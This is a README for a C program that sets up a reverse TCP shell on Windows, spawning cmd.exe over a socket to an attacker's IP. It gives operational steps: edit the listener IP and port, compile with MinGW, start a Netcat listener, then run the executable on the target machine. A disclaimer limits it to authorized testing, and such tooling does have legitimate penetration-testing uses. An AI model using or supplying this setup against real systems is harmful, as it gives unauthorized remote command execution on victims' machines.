# 🐚 Windows Reverse Shell (TCP)

This C program establishes a **reverse TCP shell** from a Windows machine to a remote attacker's IP. It creates a socket connection and spawns `cmd.exe`, redirecting all input/output through the socket — allowing the attacker to run commands on the victim's machine.

---

## 📜 Description

The reverse shell leverages:

- Winsock2 for socket programming
- `CreateProcessA()` to spawn `cmd.exe`
- Socket redirection for STDIN, STDOUT, and STDERR

This is commonly used in penetration testing to demonstrate command execution post-exploitation.

---

## ⚙️ Features

- ✅ Native Windows C code
- ✅ Uses Windows APIs (`winsock2`, `windows.h`)
- ✅ Redirects input/output to a TCP socket
- ✅ Lightweight and low-footprint

---

## 🚀 Usage

### 1. Edit IP and Port

Modify the following lines in `reverse_shell.c`:

```c
char ip_addr[] = "1.1.1.1"; // Change to your listener IP
int port = 8081;            // Change to your desired port
```

---

### 2. Compile the Code

Use MinGW or any Windows-compatible compiler:

```bash
x86_64-w64-mingw32-gcc reverse_shell.c -o reverse_shell.exe -lws2_32
```

---

### 3. Start a Listener

On the attacker's machine, start a Netcat listener:

```bash
nc -lvnp 8081
```

---

### 4. Execute

Run `reverse_shell.exe` on the target Windows machine. Once executed, the shell will connect back to your listener.


## ⚠️ Disclaimer

> This project is intended for **educational purposes** and **authorized penetration testing** only. Unauthorized use of this tool on networks or systems you do not own or have permission to test is **illegal** and unethical. Use responsibly.

---

